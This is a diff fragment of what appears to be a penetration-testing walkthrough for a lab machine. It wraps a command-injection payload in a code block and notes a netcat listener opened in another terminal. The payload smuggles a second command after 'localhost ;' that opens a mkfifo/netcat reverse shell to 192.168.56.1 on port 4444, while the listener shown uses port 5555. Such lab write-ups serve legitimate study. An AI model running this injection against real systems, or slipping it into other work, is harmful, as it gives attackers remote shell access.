@@ -325,8 +325,11 @@ It's clear that the input for both Telnet and Ping are enclosed, this is not the
 
 Lets first see if netcat is installed. It is, but it's the openbsd version. So we're going to open the following location:
 
+```
 localhost ; rm /tmp/pluck;mkfifo /tmp/pluck;cat /tmp/pluck|/bin/sh -i 2>&1 |nc 192.168.56.1 4444 >/tmp/pluck   
+```
 
+In a different terminal I started the following:
 ```bash
 ➜  keys nc -vnlp 5555
 Listening on [0.0.0.0] (family 0, port 5555)
